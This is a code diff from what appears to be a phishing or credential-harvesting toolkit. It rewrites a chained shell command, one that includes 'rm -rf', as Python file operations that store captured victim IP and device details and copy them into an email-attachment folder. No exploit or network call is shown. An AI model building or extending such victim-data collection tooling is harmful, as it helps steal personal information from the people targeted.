@@ -81,7 +81,22 @@ def credentials_collector(port):
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 log_writer('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
-                run_command('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
+                #run_command('touch Server/CapturedData/ip.txt 
+                pathlib_Path("Server/CapturedData/ip.txt").touch(mode=0o777, exist_ok=True)
+                # && cat Server/www/ip.txt >> Server/CapturedData/ip.txt 
+                captured_ips = open('Server/CapturedData/ip.txt', 'a')
+                new_ips = open('Server/www/ip.txt')
+                captured_ips.write(new_ips.read())
+                new_ips.close()
+                captured_ips.close()
+                # && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt 
+                copyfile('Server/CapturedData/ip.txt', 'Defs/FeatureManager/EmailManager/attachments/ip.txt')
+                # && rm -rf Server/www/ip.txt 
+                new_ips = open('Server/www/ip.txt', 'w')
+                # && touch Server/www/ip.txt')
+                new_ips.write('')
+                new_ips.close()
+
 
         creds.close()
 
